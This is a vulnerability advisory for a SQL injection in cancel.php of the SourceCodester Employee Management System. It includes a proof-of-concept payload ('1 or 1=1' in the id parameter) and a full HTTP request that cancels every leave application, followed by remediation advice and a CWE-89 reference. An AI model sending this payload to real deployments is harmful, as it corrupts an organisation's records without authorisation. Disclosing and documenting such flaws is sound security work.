## SourceCodester Employee Management System cancel.php SQL Injection

### Vendor Homepage:
[SourceCodester Employee Management System](https://www.sourcecodester.com/php/14432/employee-management-system-using-php.html)

### Impact:
The SQL injection vulnerability in the `cancel.php` script of the SourceCodester Employee Management System allows attackers to manipulate SQL queries through the `id` parameter. By injecting a specially-crafted payload such as `"1 or 1=1"`, attackers can cancel all leave applications, regardless of their legitimacy. This could lead to chaos within the system and disrupt normal operations, potentially causing significant inconvenience and confusion among employees and administrators.

### Proof of Concept:

1. Make a GET request to `cancel.php`.
2. Use the parameter `id` with the payload `"1 or 1=1"`.
3. All records are updated.

### Request Example:

```http
GET /cancel.php?id=1%20or%201=1&token=1 HTTP/1.1
Host: localhost:8080
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
sec-ch-ua-platform: "macOS"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

## Remediation:
To mitigate the SQL injection vulnerability in cancel.php, input validation and parameterized queries should be implemented to sanitize user input effectively. Additionally, access controls should be enforced to ensure that users can only modify their own leave applications. Regular security assessments and code reviews should be conducted to identify and address any vulnerabilities in the application's codebase, ensuring robust protection against SQL injection and other security threats.

## CWE:
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)